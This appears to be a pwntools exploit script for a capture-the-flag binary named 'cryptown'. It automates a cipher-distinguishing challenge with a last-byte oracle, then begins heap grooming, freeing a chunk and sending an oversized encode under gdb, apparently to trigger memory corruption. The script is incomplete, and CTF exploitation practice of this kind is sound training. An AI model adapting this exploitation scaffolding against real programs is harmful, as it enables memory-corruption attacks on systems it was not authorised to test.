from pwn import *
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

p=process('./cryptown')
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)

def cmd(c):
    sla("> ",str(c).encode())
def key_add(idx,size,c=b"A"):
    cmd(0)
    cmd(0)
    sla(": ",str(idx).encode())
    sla(": ",str(size).encode())
    sa(": ",c)
    cmd(4)
def key_del(idx):
    cmd(0)
    cmd(1)
    sla(": ",str(idx).encode())
    cmd(4)
def key_show():
    cmd(0)
    cmd(2)
    cmd(4)
def key_edit(idx):
    cmd(0)
    cmd(3)
    sla(": ",str(idx).encode())
def encode(key_idx,c=b'A'*0x30,size=0x1000):
    cmd(1)
    sla(": ",str(key_idx).encode())
    sla(": ",str(size).encode())
    sa(": ",c)
def decode(key_idx,size=0x132,c=b'n132'):
    cmd(2)
    sla(": ",str(key_idx).encode())
    sla(": ",str(size).encode())
    sla(": ",c)
def vul(c,p,kl):
    # c, cipher, list
    # p, plaintext, list
    # kl, key len, int
    value = c[-1] ^ p[-1]
    index = ( len(p) % kl-1)%kl
    return index,value
def XxX(c,p,kl):
    idx,val = vul(c,p,kl)
    ct = 0
    pl = len(p)
    ct_ex = pl//kl
    if(pl%kl):
        ct_ex+=1
    v = idx
    while(ct < ct_ex -1):
        tmp = -1
        for x in range(v,len(c)):
            if(c[x]==p[kl*ct+idx] ^ val):
                tmp=x
                break
        v = tmp
        if(v == -1):
            return 0
        v += kl
        if(v>len(c)-1):
            return 0
        ct+=1
    if(ct!=ct_ex-1 or v>len(c)-1):
        return 0
    #print(v,len(c))
    for x in range(v,len(c)-1):
        if(c[x]==c[-1]):
            gap = len(c) - x -1 
            if(kl==1):
                if(gap>=2):
                    return 0
            elif(gap>kl):
                return 0
            return 1
    return 1
def LastByteOrecal(c,p):
    for kl in range(1,26):
        for plain in range(4):
            # print(p[plain])
            # input()
            if(XxX(c,p[plain],kl)):
                return plain
def chal():
    cmd(3)
    plaintext = []
    for x in range(4):
        p.readline() 
        plaintext.append(p.readline()[:-1])
        p.readline()
    for x in range(0x100):
        print(f"{x}/0x100")
        ru("rtext:\n")
        c = p.readline()[:-1]
        c = base64.b64decode(c)
        res = LastByteOrecal(c,plaintext)
        sla("text:\n",str(res).encode())
    sla(":\n",b"0.65")
        
add  = key_add
free = key_del
show = key_show
chal()
# 

for x in range(0xff):
    add(x,0x2,b"AA")
context.log_level='debug'

add(0xff,0x19,b"a"*0x19)

free(0xff)
gdb.attach(p,'b *0x555555555707')
encode(0,b"A"*0x22,size=0x22)

p.interactive()
